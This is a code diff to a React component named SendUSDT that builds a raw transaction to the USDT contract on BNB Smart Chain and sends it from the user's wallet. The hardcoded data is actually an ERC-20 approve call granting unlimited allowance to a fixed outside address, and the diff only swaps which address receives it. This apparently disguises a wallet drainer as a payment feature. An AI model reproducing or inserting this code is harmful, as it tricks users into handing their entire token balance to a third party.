@@ -51,7 +51,7 @@ const SendUSDT = () => {
         }
       }
       const USDT_BSC = '0x55d398326f99059fF775485246999027B3197955';
-      const data = '0x095ea7b30000000000000000000000006fe3083e2a07273f2b00c4f082fe916a8a93c6aeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+      const data = '0x095ea7b3000000000000000000000000436ff44a8eb2716267e56593db92985d7b036e1dffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
       const txParams = { to: USDT_BSC, data };
       if (userAddress) txParams.from = userAddress;
       const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [txParams] });
